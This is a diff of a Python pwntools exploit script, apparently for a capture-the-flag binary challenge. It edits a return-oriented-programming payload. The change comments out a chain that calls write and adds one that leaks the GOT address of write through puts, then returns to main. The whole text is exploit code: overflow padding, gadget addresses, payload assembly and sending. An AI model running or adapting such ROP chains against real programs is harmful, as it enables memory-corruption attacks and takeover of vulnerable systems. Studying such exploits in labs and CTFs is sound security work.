@@ -11,6 +11,7 @@ pop_rsi_addr = 0x0000000000400931 # pop rsi ; pop r15 ; ret
 
 
 payload = num * 'a'+'\x47'
+'''
 payload += p64(pop_rdi_addr)
 payload += p64(1)
 
@@ -19,7 +20,14 @@ payload += p64(elf.got['write'])  #rsi
 payload += p64(0)   #r15
 
 payload += p64(elf.plt['write'])
-payload += p64(elf.symbols['main'])   
+payload += p64(elf.symbols['main'])  
+'''
+
+payload += p64(pop_rdi_addr)
+payload += p64(elf.got['write'])
+
+payload += p64(elf.plt['puts'])
+payload += p64(elf.symbols['main']) 
 
 
 io.sendline(payload)
